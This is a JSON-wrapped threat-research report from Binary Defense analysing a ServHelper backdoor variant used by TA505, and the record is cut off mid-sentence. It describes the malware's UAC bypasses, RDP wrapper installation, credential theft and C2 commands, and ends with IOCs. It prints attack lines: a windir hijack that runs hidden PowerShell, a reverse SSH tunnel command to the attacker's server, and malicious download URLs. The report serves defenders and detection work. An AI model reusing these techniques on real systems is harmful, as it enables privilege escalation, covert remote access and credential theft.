{
    "id": "b0a17086-e419-44ef-b140-32731525cfb7",
    "created_at": "2023-01-12T15:09:54.055151Z",
    "updated_at": "2025-03-27T02:15:38.098159Z",
    "deleted_at": null,
    "sha1_hash": "724e74e44a27f674eab5cbdf7fa062fe3356368b",
    "title": "2019-12-20 - An Updated ServHelper Tunnel Variant",
    "authors": "",
    "file_creation_date": "2022-05-28T17:48:03Z",
    "file_modification_date": "2022-05-28T17:48:03Z",
    "file_size": 2135300,
    "plain_text": "# An Updated ServHelper Tunnel Variant\n\n**[binarydefense.com/an-updated-servhelper-tunnel-variant/](https://www.binarydefense.com/an-updated-servhelper-tunnel-variant/)**\n\nJames Quinn, Threat Researcher for Binary Defense\n\n## Executive Summary\n\n\nDecember 20, 2019\n\n\nBinary Defense Researchers discovered active Command and Control (C2) servers and a\nnew version of ServHelper, a malicious Remote Desktop Protocol (RDP) backdoor program\nknown to be used by the threat group TA505. TA505 is a financially motivated threat group\nthat has been active since at least 2014. The group is known for frequently changing\nmalware and driving global trends in criminal malware distribution. (link to MITRE ATT&CK\n[page on TA505: https://attack.mitre.org/groups/G0092/). The new version of ServHelper](https://attack.mitre.org/groups/G0092/)\nattempts to evade defenses by tunneling RDP connections through a Secure Shell (ssh)\nconnection back to the threat actors’ servers. Indications of Compromise (IoCs) and\nstrategies to increase detection of this new threat are provided at the end of this report. A\ncomplete technical description of the malware’s operation and layers of protection are\ndetailed for other malware analysts to use when analyzing and identifying malware samples\nfound in incident response or threat hunting activities.\n\n\n-----\n\n## Malware Sample Discovery\n\nBinary Defense’s Threat Hunting team recently discovered a malware distribution server\nused by the cybercrime group TA505. Stored on that server were various commodity\nRemote Access Trojans (RATs) and downloaders, including the downloader Amadey, which\nhas been known to deliver FlawedAmmyy and EmailStealer. Among the commodity RATs\nwas a file called “signed.exe” that contained several layers, or stages, of obfuscation to\ndisguise the final payload: a new variant of ServHelper, TA505’s main downloader and\nRemote Desktop Protocol (RDP) backdoor. The new variant uses OpenSSH to tunnel RDP\nconnections from the victim computer back to the attacker’s server and includes some new\ncommand options. Refer to the MITRE ATT&CK page on ServHelper for more background:\n[https://attack.mitre.org/software/S0382/](https://attack.mitre.org/software/S0382/)\n\n## Initial Analysis – a PowerShell Script Packed Using NSIS\n\nUpon investigating “signed.exe”, the first takeaway is that it is packed using the Nullsoft\nScriptable Installer System (NSIS), which is an open source installation package utility.\nTypically, this form of packer can be easily unpacked by opening the file as a zip file in an\nunarchiving program and extracting the contents. However, this installer had been modified\nand cannot be extracted with all unarchivers. 7-zip’s command-line interface (CLI) extractor\nwas the most successful for pulling out the payload stored in signed.exe. Contained inside\nof “signed.exe” is a PowerShell script file named premiumlegitYFDTBOHHRX.ps1.\nInterestingly, the file information for “signed.exe” described it as “premium legit\nYFDTBOHHRX isntaller”[sic – the malware contained the misspelling of installer as written].\nPivoting off the use of “premium legit” in the signature reveals 20 files that all match\n“signed.exe” in functionality, uploaded to VirusTotal in early November 2019. Hashes for all\nmatching files are included in the IOC section.\n\nFig. 1. File Information\n\n## PowerShell Analysis – Encrypted Binary Data Encoded Using Base64\n\n\n-----\n\nThe premiumlegitYFDTBOHHRX.ps1 file is a large (3.6MB) file filled with mainly Base64encoded data. Decoding the Base64-encoded data reveals encrypted binary data. At the\nend of the script is a small bit of code that takes two supplied arguments, decodes and\ndecrypts the Base64-encoded data using the arguments as keys, then executes the result\nwith an Invoke-Expression call, which indicates that the decrypted result is expected to be\nPowerShell code.\n\nFig 2. Binary Decryption\nBy replacing the Invoke-Expression call with “Write-Output $VRFJLOKRGX | Out-File\nMalware.txt”, the malware will do all the difficult decrypting and then write it to a file for easy\nanalysis.\n\n## PowerShell Analysis, Part 2 – Decrypted Payloads Include RDP Wrapper and UAC Bypass\n\nJust like the first PowerShell script, this script is also massive at 5MB, because it packs so\nmany payloads inside itself. Along with both a 32-bit and 64-bit version of the ServHelper\nbot and Remote Desktop Protocol (RDP) wrapper, the PowerShell script also includes the\nUser Access Control (UAC) bypass tool called uacme, using DLL files named fubuki32 and\nfubuki64 also embedded inside. Additionally, there are various config files and other DLLs\nused by the RDP wrapper. As the PowerShell script is massive, analysis is difficult.\nHowever, toward the bottom of the script, the first few commands that are run attempt to\nquery the System Management Bios data tables (SMBiosData), in order to evaluate privilege\n\n\n-----\n\nstatus. Analysis of the script and testing of the malware in a controlled environment proved\nthat a function named “heller” is called when the script is executed from a non-privileged user\naccount.\n\n## Privilege Escalation “heller” Function Analysis\n\nThe heller function serves the purpose of the privilege escalation for the PowerShell\ninstaller. At the beginning of the function are the uacme DLLs (fubuki32 and fubuki64),\nencoded in decimal. Additionally, heller initializes some optional parameters, which were\nunused in this script, but would allow the loading of custom DLLs if they were used in a\ndifferent variant. The malware also uses a simple and elegant technique to determine OS\narchitecture. If the size of an IntPtr is 4 bytes long, it is a 32-bit system; if an IntPtr is 8 bytes\nlong, the system must be 64-bit. The PowerShell script includes both a 32-bit and a 64-bit\nversion of uacme and will run whichever DLL matches the OS architecture. These DLLs are\nmodified from the standard uacme; their main purpose is to relaunch the PowerShell script\nwith the highest privilege level.\n\n## Privilege Escalation on Windows 7\n\nNext, the malware looks at what OS version it is running on and compares it to three strings:\n“10” for Windows 10, “76” for Windows 7, and “96” for Windows 8. These strings ultimately\ndecide which exploit is used to escalate to the highest privilege level. If Windows 7, the\nuacme dll is renamed “Cryptbase.dll”, and is then written to C:\\Windows\\System32\\Sysprep\\,\nand then sysprep.exe is called. This particular method takes advantage of DLL search order\nhijacking. When sysprep.exe is loading its libraries, it will search its current directory first,\nwhere it will locate and load the malicious Cryptbase.dll, thus triggering the UAC bypass.\n\n## Privilege Escalation on Windows 8 and Windows 10\n\nIf the script is run in Windows 8 or Windows 10, the malware will abuse the DiskCleanup\nutility. First, the malware will change the environment variable “windir”\n[(HKCU:/Environment/windir) from the standard value “C:\\Windows” to the following value:](http://10.10.0.46/file:/Users/C:/Windows)\n\npowershell -ExecutionPolicy bypass -w hidden -Command `”& `’$pth`’`”;”\n\nwhere $pth is the full path to the malicious script to execute. With that set, it will then run the\ntask \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup, which will execute the PowerShell\nscript with highest privileges.\n\n## Analysis of Installer Restarted with Elevated Privileges\n\nOnce the script is running with highest privileges, and after querying the System\nManagement Bios, the install function is executed to install the malware to the victim’s\ncomputer. Contained inside the PowerShell script are several buffers of Base64-encoded\n\n\n-----\n\ngzip-compressed data. Decoding and unzipping that data yields more base64 encoded\ndata. That final layer of base64 data appears to be the last layer of encoding.\n\nFig 2. Install Buffers\n\n## Decoding Registry Key and Values into file mstc.reg\n\nAs demonstrated in the above screenshot, the first buffer to be used is a buffer called “$reg”,\nwhich contains a registry key and associated values. The registry key and values are\ndecoded using a function named “react” and saved to a file named mstc.reg in the $TEMP\nfolder. The malware then looks for the termservice service, and if it doesn’t exist, imports the\nnow decoded $reg from the file mstc.reg.\n\n## Decoding and Saving RDPwrap Binary Files and Configuration File to Windows Mail Folder\n\nAfter saving the registry key and values into the mstc.reg file, several buffers containing\nadditional binaries are initialized. The variable names are as follows:\n\n[$rdp – 32-bit modified RDPwrap](https://github.com/stascorp/rdpwrap)\n\n$bot – 32-bit ServHelper\n\n[$rdp64 – 64-bit modified RDPwrap](https://github.com/stascorp/rdpwrap)\n\n$bot64 – 64-bit ServHelper\n\n$cfg – RDP wrapper config\n\n$clip – legitimate rdpclip.exe\n\n$vmt – legitimate rfxvmt.dll\n\n\n-----\n\nAfter performing another IntPtr OS architecture check, the corresponding 32-bit or 64-bit\nversions of RDP wrapper and ServHelper bot are saved to the following locations on disk:\n\n**%ProgramFiles%\\Windows Mail\\appcache.xml (RDPwrap)**\n**%ProgramFiles%\\Windows Mail\\default_list.xml (ServHelper bot)**\nAdditionally, the config file is saved to:\n**%ProgramFiles%\\Windows Mail\\cleanuptask.cfg.**\n\nRegarding the two legitimate binaries, rdpclip.exe is necessary for file copy and pasting in an\nRDP session while rfxvmt.dll is necessary for Microsoft RemoteFX VM Transport, which adds\nadditional functionality to RDP, like access to physical Graphics Processing Units (GPUs) for\nhardware acceleration.\n\nA search for those 2 files is performed on the computer, and if they are not found, the\nmalware will write them to the system. Additionally, the malware will make the following\npermission changes:\ntakeown.exe /A /F rfxvmt.dll\nicacls.exe rfxvmt.dll /inheritance:d\nicacls.exe rfxvmt.dll /setowner “NT SERVICE\\TrustedInstaller”\nicacls.exe rfxvmt.dll /grant “NT SERVICE\\TrustedInstaller:F”\n\nicacls.exe rfxvmt.dll /remove “NT AUTHORITY\\SYSTEM”\nicacls.exe rfxvmt.dll /grant “NT AUTHORITY\\SYSTEM:RX”\n\nicacls.exe rfxvmt.dll /remove “BUILTIN\\Administrators”\nicacls.exe rfxvmt.dll /grant “BUILTIN\\Administrators:RX”\n\nThese permission changes are necessary for the two dropped DLL files to function properly.\n\n## Maintaining Persistence\n\nIn order to maintain persistence, the malware first changes the RDP port from 3389 to 7201.\nThis aids in hiding traffic, as RDP now communicates from an unexpected port. Additionally,\nbecause the Windows Display Driver Model (WDDM) driver has been known to black screen\ncomputers on RDP user disconnect, the malware disables this. Also, the modified RDPWrap\n(appcache.xml) is installed as the TermService ServiceDll. This modified RDPWrap will then\nlocate and load the Servhelper bot, while also proxying function calls to the legitimate\nTermserv.dll.\n\nWith everything installed, the malware then runs the function “cleanupper”, which removes\nany .tmp, .ps1, and .txt files stored in %temp%. Additionally, the malware restarts the\nTermServ service, along with the RDPDR service. It also grabs the main username by\nquerying env:username. It saves this file to a file called usrnm.txt, which it saves to %tmp%.\n\nThe malware is now fully installed and running with SYSTEM level privileges.\n\n\n-----\n\n## ServHelper (SSH Tunneling Variant) Analysis\n\nOriginally discovered by Proofpoint in November 2018, ServHelper is one of TA505’s custom\nbackdoors and downloaders. While the functionality of the two variants discovered by\nProofpoint appeared to be split with one variant acting as a downloader and the other acting\nas a backdoor, the variant found in early November 2019 appears to combine aspects of\nboth old variants along with the addition of browser credential theft.\n\n## Packed with PeCompact\n\nIn its base form, ServHelper is packed with PeCompact, a well-known packer used for\nlegitimate software and malware alike. While there are two versions of ServHelper contained\nin the PowerShell script—a 32-bit version and a 64-bit version—they are largely identical and\nkey functionality is the same for both.\n\n## Anti-Sandbox Evasion Technique: Searching for Microsoft Anti-Virus VM File\n\nOne of the first actions performed by the malware is to search for the Microsoft Antivirus VM\nfile, aaa_Touchmenot_.txt, which is stored in the root directory. To get the value\n“aaa_Touchmenot_.txt”, the malware must decrypt the string “w:\\\\yuo_RiirfGsCmn_.rrh”,\nusing a four character Vigenere square cipher. If the malware detects that the AV VM file\nexists, the malware quits. The string is stored in encrypted form likely to evade static\ndetections for that particular file name. The malware detects if it is running in an AV sandbox\nto evade behavior-based automated analysis.\n\n\n-----\n\nFig 3. Intro\n\n## Decrypting Bot Configuration for Command and Control\n\nNext, after determining that the malware is not running in an AV sandbox, the malware\ndecrypts a series of important strings used for C2 connection. The strings (with a brief\ndescription for each) are below:\n\nlot – XOR network key\nwgautilacc – user account to be installed\n0000999999 – Placeholder\nhttp:// – beginning part of main C2 address\nlaph.icu – Main C2 Address\n/like/b.php – php file used by C2\nlopottw – malware key\nVXVRPCHJ – Name of file dropped by malware that contains profile information\nservice1.exe – Renamed ssh.exe\nshhhfjsiagguud.icu – Backup C2\nfdg4a35ggs.pw – Backup C2\nnov5 – BotID\njun12 – Backup BotID\n000009999999 – Placeholder\nhttp://almagel[.]icu/cp.exe – Profile Swap information\nhttp://almagel[.]icu/ssh.zip – ssh backup\n\n\n-----\n\nhttp://gabardina[.]xyz/log.txt – Encrypted NetSupport RAT\nc:\\windows\\temp\\ – Drop location\nupdsvc.exe – Renamed update service\nfesdg – password for cp.exe\nhttp://kuarela[.]xyz/1.txt – Unused C2\n\nMany of the functions used by this RAT are formatted like this. The malware decrypts the\nstrings to be used in the beginning of the function.\n\n## Verifying Runtime Environment and Locating Saved Values in Temp File\n\nNext, after decrypting a few more strings used by the malware in startup, the malware\nchecks that the command line arguments do not contain “asfofhr”, “fsfifh4a”, or “huff”. The\nfirst two strings are the names of exported functions in the DLL, while the name “huff” is not\nan exported function name and may be either a leftover from a previous version or a\nplaceholder meant for a new version. Next, the malware will search for a file named\nVXVRPCHJ, stored in %temp%, which contains the following information:\n\nbotid\nOSVERSION\narchitecture\nComputerName\nUsername\nAddedUsername\nAddedPassword\nNumber\n\nFor example, in the analyzed sample, the file named VXVRPCHJ contained the following:\n\nnov5;Windows 10 (Version 10.0, Build 18362, 64-bit Edition);x64;DESKTOP<REDACTED>$;<REDACTED>;winacc:wgautilacc;8r7aIf0j;78874\n\nIf VXVRPCHJ file exists, the malware will then parse out that information and continue. If\nVXVRPCHJ does not exist, the malware will run its install function.\n\n## ServHelper Install Function\n\nThe ServHelper install function has one goal: to install the user account used by the threat\nactor, as well as ensuring that RDP is set up fully for the threat actor’s uses. As a result, one\nof the first actions taken by this function is to enumerate groups contained on the computer\nand to also add the threat actor account to the computer.\n\n\n-----\n\nFirst, the local group install function decrypts the SID s related to both the Administrators\nGroup (S-1-5-32-544) as well as the Remote Desktop Users group (S-1-5-32-555), and then\nuses them to enumerate said groups. From there, the malware adds the threat actor\naccount to both Administrators group as well as the Remote Desktop Users group. This\nallows them to remotely connect to the infected machine.\n\n## Setting RDP Configuration Options\n\nWith the threat actor account created and added to the admins and RDP groups, the\nmalware moves to ensuring RDP is configured in the proper way. This involves changing the\nfollowing registry key values for SYSTEM\\CurrentControlSet\\Control\\Terminal Server :\n\nfDenyTSConnections – Set to 0, this allows Term Service connections\nFSingleSessionPerUser – Set to 1, this forces each newly connected user to use the\nsame session\n\nFor SYSTEM\\CurrentControlSet\\Control\\Lsa:\n\nLimitBlankPasswordUse – Set to 0, allows users without a password to remotely\nconnect\n\nFor SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Licensing Core:\n\nEnableConcurrentSessions – Set to 1, allows for simultaneous connections of multiple\nremote users at once\n\nFor SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon:\n\nAllowMultipleTSSessions – Set to 1, allows for multiple Terminal Service connections at\none time\n\nFor SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList:\n\nAdd wgautilacc to this list of accounts\n\nFor Software\\Policies\\Microsoft\\Windows NT\\Terminal Services:\n\nfAllowToGetHelp – Set to 1, which allows the victim computer to “receive help from a\nfriend or a support professional”\n\nWith RDP properly set up, the malware shifts to creating the VXVRPCHJ file that it searches\nfor to check if installation was successful.\n\n## Creating VXVRPCHJ File to Store Saved Values\n\n\n-----\n\nFirst, the malware checks usrnm.txt, which was dropped by the PowerShell script. Next, it\nenumerates architecture type by checking the value of the environment variable\n“ProgramW6432”. If the environment variable has a value, the architecture is 64-bit. If not,\nthe architecture is 32-bit. The malware also grabs the botid, OS type, and threat actor\naccount info, which it then saves to VXVRPCHJ, in the format\n\nbotid\nOSVERSION\narchitecture\nComputerName\nUsername\nAddedUsername\nAddedPassword\nNumber\n\n## Non-Main Threads – Accessing Chrome Browser Profiles and Keylogger Thread\n\nWith the malware fully installed, it then moves to executing the non-main threads. The first\nthread to be executed launches the exported DLL function named “fsfifh4fa”, which is used\nby the malware to access the victim’s Chrome web browser user profiles. This export\naccepts the following commands: nouac, chrome, launch.\n\nAdditionally, the malware launches the keylog thread, which executes the bot DLL with the\nexport “huff”. Huff is interesting because in the analyzed version of this malware, huff does\nnot exist. However, it is used throughout the malware for keylogging purposes. If huff did\nexist, the malware would save the logged keys to a file stored in temp called “mod.txt”. This\nmay represent planned future functionality for the malware.\n\n## ServHelper Main Threads\n\nWith the export and keylogging threads setup (if the DLL implements a keylogger function),\nthe malware first decrypts a string that translates to “main thread”, before creating two\nthreads. The first thread seems to be in charge of all communication as well as all\ncommands that the C2 can run when communicating back to the bot. The next thread is in\ncharge of opening an SSH tunnel\n\nto send all RDP traffic back to the C2. This thread is also in charge of ensuring that the\ntunnel stays open.\n\n## OpenSSH Tunnel Thread\n\n\n-----\n\nAs this thread is in charge of installing the tunnel as well as ensuring the tunnel stays open,\nthe function will first enumerate all processes and step through them in order to ensure that\nthe openssh.exe is not already running (indicating an open tunnel). Additionally, the malware\nsearches for the openssh binary. If neither are found, the malware downloads ssh from the\nssh backup C2 and then opens a ssh tunnel using the following command:\n\n**openssh.exe -N -R :localhost:7201 tunnel@ -o “StrictHostKeyChecking=no” -o**\n**“ExitOnForwardFailure=yes” -o “ServerAliveInterval=5” -o “ServerAliveCountMax=1”**\n\nThe command uses -N to instruct ssh to not execute a command on the remote server.\nAdditionally, it uses -R to allow localhost:7201 to be tunneled to the ssh server. Finally, it\nsets the command line options like StrictHostKeyChecking, using -o. With the tunnel\nproperly installed, the malware will decrypt “tun ok on server”, and send that string, the port\nthat the tunnel exists on, along with the Process ID (PID) of the tunnel openssh process back\nto the C2.\n\n## Communication Thread – Using HTTP or HTTPS to Communicate with the C2 Server\n\nThis thread is in charge of communicating back to the C2 as well as parsing and executing\nany commands sent back from the C2 server. Communication is encrypted with a XOR key\ndecrypted in the C2 function. Additionally, data sent by the bot to the C2 is also encoded\nwith base64.\n\nIn order to establish connection with the C2, the bot must first decrypt the following useragent:\n\nMozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0\n\nThe malware uses the following arguments which are passed to the C2 php script in a POST\nrequest:\n\nkey=\nsysid=\nresp=\nrights=\nmisc=\n\nThe malware will encrypt all traffic using the multi-bit XOR key, “LOT” (hex: 4c 4f 54). It will\nalso encode all of its responses with base64 to aid in hiding the traffic. All traffic is sent over\nhttps using Let’s Encrypt issued certificates. In order to help with analysis, the malware was\nexecuted on a test machine with all network traffic redirected to a local analysis computer for\ncapture and viewing. Additionally, modifications were made to the code to force http instead\nof https. The screenshot below shows a message sent from the malware to its C2 server:\n\n\n-----\n\nFig 4. POST data\nThe data translates to\n\nkey: lopottw\nsysid: nov5;Windows 10 (Version 10.0, Build 18362, 64-bit Edition);x64;\n<REDACTED>$;<REDACTED>;winacc:wgautilacc;yFGxsd8q;47354\nresp: nop ok\nrights: ffff\n\nAfter receiving a response from the server, the malware parses the response and compares\nit to a series of commands in order to decide what to do with the response. In the above\nrequest, the server issued the “nop” command, which is the heartbeat equivalent command\nfor this malware.\n\n## Commands Accepted by the Bot\n\nThis malware has around 30 commands that the C2 can send to interact with the malware.\nWhile many of these commands have been discussed in the Proofpoint analysis, a few of\nthese are new and will be discussed in further depth later in this analysis. The total list of\ncommands are as follows:\n\n**Command** **Description**\n\nbk Set up tunnel with specified C2 address instead of hardcoded C2\naddress\n\ninfo Obtain information about the infected victim\n\nfixrdp Fix RDP keys, as performed in the install function\n\nupdateuser Update threat actor’s added account username and password\n\ndeployns Download and deploy the NetSupport RAT\n\nkeylogadd Add an additional keylogger\n\nkeylogdel Delete Keylogger\n\nkeyloglist List all keyloggers\n\n\n-----\n\nkeylogreset Reset keyloggers\n\nkeylogstart Start logging keys\n\nsshurl Download ssh.zip\n\ngetkeylog Obtain log of logged keys\n\ngetchromepasswords Grab all chrome passwords from the sqlite3 database that chrome\nstores them in. Saved to c:\\windows\\temp\\logins_read.txt\n\ngetmozillacookies Grab all mozilla cookies. Saved to c:\\windows\\temp\\moz.txt\n\ngetchromecookies Grab all chrome cookies. Saved to c:\\windows\\temp\\cookies.txt\n\nsearch Allows the threat actor to search chrome cookies, passwords, and\nmozilla cookies\n\nbkport Like bk, but allows the threat actor to specify port instead of C2\naddress\n\nhijack Attempts to hijack a user’s account\n\npersist Adds additional persistence to the malware\n\nstophijack Stop the active hijack\n\nsethijack Set the hijack settings for logged in user\n\nsetcopyurl Set url to download profile copier (cp.exe)\n\nforcekill Force kill open process\n\nnop Heartbeat\n\ntun Open a ssh tunnel\n\nslp Sleep\n\nkilltun Kill all ssh tunnels\n\nshell Open a cmd shell\n\nupdate Updates the current running malware\n\nload Downloads and executes a file from a URL\n\nsocks Similar to tun, allows a reverse tunnel to be opened on any port on\nthe infected machine\n\n## Command Explanations: info Gathers Victim Computer Information\n\n\n-----\n\nThe info command will obtain the following information pertaining to the infected victim:\n\nTotal RAM memory\nVideo Controller Name\nCPU name\n\nThis is a good way to identify if an infected victim is a VM, as VM RAM count should be fairly\nsmall, and either Video Controller or CPU may be named something associated with VMs.\nAdditionally, the info command will perform an internet speed test of the infected machine.\n\nAll of this data will be combined together and sent back to the C2 using the misc argument,\nas shown in the example message from the bot to the C2:\n\nFig 5. POST data\n\n## Command Explanation: deployns Downloads NetSupport Tool\n\nOne key feature of this backdoor is its ability to download and deploy an additional remote\nadministration tool called NetSupport. This software, which is typically used in classroom\nmanagement, is a commercially available remote administration tool. The software’s\nfeatures include:\n\nRemote Desktop Management\nFile Transfer\nRemote Inventory and System Management\nLaunching applications on Client machines\nGeolocation\n\nWhen a ServHelper bot is sent the “deployns” command, the bot executes one of its exports\nand reaches out to one of the hardcoded C2 servers (http://gabardina[.]xyz), which houses\nlog.txt, an encrypted zip file containing the NetSupport tool along with configuration\ninformation. From there, the malware decrypts the zip file using a single bit XOR key (0x09),\nand then executes and installs NetSupport.\n\n## Command Explanation: Keyloggers\n\n\n-----\n\nWhile the huff export is missing from the malware (indicating that this malware may not be\ncomplete yet), this command uses the huff export in order to deploy a keylogger which saves\nall logged data to %temp%/mod.txt. These keyloggers seem to be deployed using pipes,\nhowever, as the required export is missing, analysis of these pipes is nearly impossible.\n\n## Command Explanation: persist Persistence via Scheduled Task and PowerShell\n\nThe persist command is a relatively unique way that the malware can maintain “Advanced\nPersistence”, as the malware itself calls it.\n\nFirst, the malware ensures that the RDP wrapper is installed to the TermService service.\nNext, the malware dynamically generates a PowerShell script, which it calls <random\nnumber>.ps1, and saves to C:\\Windows\\help. This PowerShell script first searches for both\nthe RDPwrapper and the Servhelper bot dll (%ProgramFiles%\\Windows\n**Mail\\appcache.xml and %ProgramFiles%\\Windows Mail\\default_list.xml). If neither of**\nthese files are found, the malware attempts to download them, using a hardcoded URL.\nUnfortunately, in this sample, the hardcoded URL did not exist and instead was 0000999999.\n\nThis script is then saved to a scheduled task that runs every minute.\n\n## Conclusion\n\nAs this malware is a fairly advanced sample compared to the malware we typically cover, we\nare holding off on creating a removal section of this report. Instead, the IOCs will be\nincluded at the bottom. Of course, SOC analysts at Binary Defense have been made aware\nof this malware and are on the lookout for any behaviors that generate any alarms for this\nmalware on any of our clients’ endpoints.\n\n## Indications of Compromise (IOCs)\n\n Dropper:\n\nd8ad452417d14d5c9bceb82e957d0b19552119c6e3412baef7541693b864945b\n3ecb850d8bbff8cb0a5b6358d78e8fedaf22435fac0372df8ebec9bbd37557eb\n5f56d9f78780ae94f05765368a16206378b1e8862142b12ab64060d64b20f4eb\n8503cd4cc1a9a5e59760e8b06ca366121cb7fd410ae07a1d07464099b86fa6a4\neae8bf7405b63f82c2a1300ba0151cfbc44b4ff8eba7104148f72018e7bacd75\n485caa5d43f92e9cd6805b4d08f0cda5f299acdde499e308cd6d3348c4de618b\ncafe419979c66773cdc347e19724dd8d43002f0823be64ef4abc18962f2beebd\nc4cb203ab60c8ac26653a56447b2029e47099d3b61460c60e8b43ef178ff591e\n93af9026ac13cee019310b91cf9d580fd232d0855082926c46684a7cdea11f39\n22391e2ba6e3c19e6230e1fb12e6d85eae9da54be6876cbf5084a3c16d912b8b\n\n\n-----\n\nacaa1dc11f0ba6aebf6f551be1b3e8e31f5ef49a845af1d275342ce57ef5e194\n7ab3bb1e2783b8ddbb5581cde1cfb97fdf2c105ed0063a08abe2c2255d703315\n142340c1615cb8102bf9fcd0da938d141baf0f28de506ebe88314090e26202af\n2776a3cf0782a6c6c12f15531a25cb3edb1d0dda6be650ab480e4ab629526d8d\n01c225c7a9851e7e38934825ca79a81acde03cbe6dd878140519018c7d89ca2a\n6a314a7c2222e110004dc1f6cc5416cf846b544934f6b7dba9741c553550f798\n1c3b61a98c8804ce24fa80053dffb195131721bef99af8d527ac8d36c90d7f0e\n65ccd3f86b9af59dc9e32bac2866e31e5c4ee700d98607f9122711ea82843c43\nbd7e56171d944aca467acb48a49f4442983296a9b41b1bb6d35227bb122a1ee8\n6d305c90a25fc4352f9b0a53e40ce11c6da280c62f15c203c259468f0bfaf263\n0c8bdc3025deae6602252e0a9753ecf387b770deb63025023f177a54e65bb685\ne6dec6087197824f9bbaa932be0d6e06565a76f7bc4daab13f7a8c33b2097672\n1ff98e17f566ca5bb1ea4468f5486227e983beb90f7eeb8489631fd288786ce9\n87f5db0684fc4f0cb4a149eaa71b57c9edcd1dd6acf1e4a130f8bf72c8c33391\n91469da9dce2302907b58ec7546dba4b4c14867b1421adcdf2ff9aacdd18eb03\n928cea1bc5bf99b0650c2f57133694d017f32c2337ad1fe50688bb3245041659\nfc75cf3f0596e6ec24b9162a65b7f8e38598fe8ab4ae2995553823cb60eabdf0\n4885d569c333d8680d6b3427ec13b38d5d1f4797de635d473b493cbfa12faca7\n035ab0546c76d5b3ffa0ad8933eb076a168b2cedfcae73132fa808d1459b248d\n3bba5666ae0c50aacc8472c5bece1a0082e255128303b2274d6d6ca8e48154a6\n5b7a1f537a6d8a924692b57064688e00ec9174a27647468c68accd6a63c50a48\n43dfa3a46ad37ca628aeb494e474a85658f6f8720b6fa121a9977613af4aa6a8\n4bf97b58ceb280bc56a65c019e8431de198b541be959cb326286fd831cb886a8\n9addd57f899f6abab5c3e6626a9fa1c4db9525f65383441674b47bac104bdc47\n19ea7a0346ae023ce17b24d577fcaa403d7f1037d1bffac9aad822ff5c95ade3\n2a4108922238e45a94bb7a16fd40db1f5b590ed9ba2f777eb67787488eecb1d7\nbee676b128f0b468c6802d206e639d4f4b3b2d282f423b1aa284bbeebc4c7d1c\ne77dd2751f70bc3371303b193ba26e32f2d59e503040de20925f845425289c79\nc0c28e43668c88ff0aa9876a8b30e78822130d4ba8fc31357e0949027509ecbb\n69d4ecdc0d05d4573b45c825f1ee453968159b6b87163f39a0a8d445dd1a40b3\nd38020e9b98f62faf1fb7a5246ca54f7d24daa2f5e36f293e5c26396253bf30f\ncc13e8a125163bee67137962e5fddaabaedb83e8f5798778a93a395080486098\n32174b1723b43da84d25afe35b933edd95d680cc15477eae82ee849cb38b4682\n989da9e195588a0f1c19a2203d442e392b68e42329d7e814cdab6e50227a525c\nb92f6b7dac163befec16a4dfebf51f233ffe5cea681cfa52c0e85a10045e927c\necb51efc1e4c62f55986bc26dfe5bc5672e86c658201e0cdf47be840fca6dc81\n\n## PowerShell Script:\n\n36cacd6b5c52a67028b03634a30e5b3a1edd976c9196a1e86c3eacbf3d08810b\n\n985f67f230ba94997d002d03d134b46420517ab39e908f2097abbf4633e0ae61\n\n7632550547294ee685f264b46305ec39626d95c206ed643ba7768e2a1e7f3ba1\n\nd2229413ca2551e96e07e6553316b49cb370d1fe44d171675b9d869c37e9adb2\n\n\n-----\n\n4753debad55f48dc8e297a25beec0aa86e6a2649964578bc6512538b08a98e52\n1252e0403427b554b1ff20962e85a8d3dc16e494d2344a5352a8c69600fb65eb\n85939a4cf1fa95d3e62ed3a7e9605c023cf9072509fbe480c6b1c8c53d5140fb\n\n## RDPWrapper:\n\na7cc832471aeb7af112ba4784372a502b46c9160590dd476cd08d50d21bed6cc\n\n## Servhelper bot:\n\n6f58ed116b53b991522d6586c80a7061951dbf251e6943d3cfbd97f6c0126c0e\n\n## Associated IP Addresses:\n\nNote: All four of these IP addresses are hosted by MivoCloud SRL in Moldova.\n\n**94.158.245.180 – Last seen 2019-11-22 13:59:51 UTC**\n\n**185.163.45.182 – Last seen 2019-11-25 16:03:57 UTC**\n\n**94.158.245.184 – Last seen 2019-11-24 17:11:05 UTC**\n\n**185.163.45.175 – Last seen 2019-11-06 09:50:55 UTC**\n\n## Associated Domain Names:\n\nMalware communicated with the following domain names which resolve to 94.158.245.180:\n\nkilimadzhara.xyz – Last seen 2019-11-22 13:59:51 UTC (from sample:\n389776de222e780ff4245ebb7d1b242cb0f09f3be8319a78db4e1e194a1f1975)\ndsfhhhhf44555.icu – Last seen 2019-11-19 06:20:13 UTC\nfdsfsfsfs.xyz – Last seen 2019-10-09\nloportat.icu – Last seen 2019-10-22\n\nMalware communicated with the following domain names which resolve to 185.163.45.182:\n\ngabardina.xyz – Last seen 2019-11-22 13:59:51 UTC\nalmagel.icu – Last seen 2019-11-25 16:03:57 UTC in malware sample\nd5074fb0bfeaf38265b5cbb920c9069d71589653666de760459cad9850340566)\nafsasdfa33.xyz – Last seen 2019-11-24 19:21:04 UTC\nkuarela.xyz – Last seen 2019-11-25 16:03:57 UTC\n\nMalware communicated with the following domain name which resolves to 94.158.245.184:\n\nlaph.icu – Last seen 2019-11-24 17:11:05 UTC\n\nMalware communicated with the following domain names which resolve to 185.163.45.175:\n\n\n-----\n\nhedonix.icu – Last seen 2019-11-06 09:50:55 UTC in malware sample\n62256c37e9c66389652459ee0cbabce835cbc37ebee1cd87ad5c487eb33c45b6\nloprtaf.icu – Last seen 2019-10-23 00:30:08 UTC\nggaooopdj44.pw – Last seen 2019-11-06 09:50:55 UTC\nspecsrv.pw – Last seen 2019-10-04\nfdguyt5ggs.pw – Last seen 2019-09-24\n\n## User Agent String:\n\nMozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0\n\n## Host/File IOCs:\n\n%Program Files%\\Windows Mail\\appcache.xml\n%Program Files%\\Windows Mail\\default_list.xml\nC:\\Windows\\Help\\*.ps1\n%temp%\\mod.txt\n%temp%\\VXVRPCHJ\n%temp%\\usrnm.txt\n\nExecutable file containing text “premium legit” in File Information\n\n## Host/Registry IOCs:\n\nSOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\n\n(look for wgautilacc in list of 